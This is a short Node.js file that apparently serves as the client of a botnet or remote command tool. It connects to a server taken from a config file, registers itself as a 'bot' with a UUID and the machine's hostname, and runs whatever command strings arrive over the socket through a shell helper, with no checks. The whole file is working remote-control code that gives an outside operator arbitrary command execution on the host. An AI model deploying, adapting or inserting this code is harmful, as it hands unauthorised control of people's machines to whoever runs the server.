const net = require('net');
const client = new net.Socket()
const uuid = require('uuid');
const myUuid = uuid.v4();
const os = require('os');
const hostname = os.hostname();

const config = require('../config');
const shell = require('./shell')

client.connect(config.server.port, config.server.ip, () => {
  console.log('connected to '+config.name);
});
client.on('data', (data) => { 
    console.log(data.toString())
    if (JSON.parse(data.toString()).arg && JSON.parse(data.toString()).arg2){
        
       // console.log(JSON.parse(data.toString()).content+" "+JSON.parse(data.toString()).arg,shell)
       shell(JSON.parse(data.toString()).content+" "+JSON.parse(data.toString()).arg+" "+JSON.parse(data.toString()).arg2)
    }else if(JSON.parse(data.toString()).arg){
        shell(JSON.parse(data.toString()).content+" "+JSON.parse(data.toString()).arg)
    }else{
        shell(JSON.parse(data.toString()).content)
    }
    console.log()
});
client.on('close', () => {
  console.log('connection closed with '+config.name);
});


client.write(JSON.stringify({code: 'bot entered to '+config.name, message:{'uuid': myUuid, 'hostname': hostname}}));